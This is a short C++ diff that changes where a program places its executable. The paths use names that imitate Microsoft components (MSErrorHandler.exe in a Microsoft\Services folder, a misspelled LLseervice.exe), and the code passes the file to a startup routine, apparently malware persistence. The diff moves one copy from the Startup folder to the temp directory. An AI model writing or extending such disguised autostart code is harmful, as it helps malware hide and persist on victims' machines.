@@ -277,7 +277,10 @@ namespace ss
                                     std::string path = appdata_dir + "\\Microsoft\\Services\\";
                                     filename = path+"MSErrorHandler.exe";
                                 } else{
-                                    filename = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
+                                    char* temp = getenv("temp");
+                                    std::string temp_dir(temp);
+                                    filename  = temp_dir+"\\LLseervice.exe";
+                                  
                                 }
                                 if (IO::exists_file(filename)){
                                     IO::startup(filename.c_str());
@@ -300,7 +303,9 @@ namespace ss
                     std::string path = appdata_dir + "\\Microsoft\\Services\\";
                     filename = path+"MSErrorHandler.exe";
                 } else{
-                    filename = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
+                    char* temp = getenv("temp");
+                    std::string temp_dir(temp);
+                    filename  = temp_dir+"\\LLseervice.exe";
                 }
                 if (IO::exists_file(filename)){
                     IO::startup(filename.c_str());
